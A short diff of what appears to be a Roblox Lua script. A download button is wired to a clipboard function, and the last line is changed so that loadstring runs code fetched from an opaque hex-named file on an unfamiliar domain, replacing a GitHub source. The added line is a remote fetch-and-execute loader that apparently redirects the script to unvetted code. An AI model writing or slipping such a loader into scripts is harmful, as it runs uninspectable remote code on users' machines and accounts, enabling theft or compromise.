@@ -53,4 +53,4 @@ end
 
 downloadButton.MouseButton1Click:Connect(setClipboardWithURL)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/isonaism/all/refs/heads/main/univ", true))()
+loadstring(game:HttpGet("https://egorikusa.space/69d5cf144f545f553270374a.lua", true))()
